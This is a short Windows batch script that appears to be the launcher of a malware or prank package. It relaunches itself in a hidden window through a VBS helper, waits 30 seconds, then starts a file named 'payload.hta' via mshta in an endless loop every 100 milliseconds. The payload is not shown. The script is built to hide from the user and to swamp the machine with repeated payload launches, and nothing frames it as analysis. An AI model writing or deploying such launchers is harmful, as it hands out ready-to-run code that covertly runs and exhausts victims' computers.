@echo off

:: Start hidden ::

	if not "%1" == "hidden" (
		start "" wscript "%~dp0hiddenstart.vbs" "cmd /c ^"%~dp0index.cmd^" hidden"
		exit /b
	)

cscript //Nologo %~dp0sleep.vbs 30000

:start
start "" mshta "%~dp0payload.hta"
cscript //Nologo %~dp0sleep.vbs 100
goto start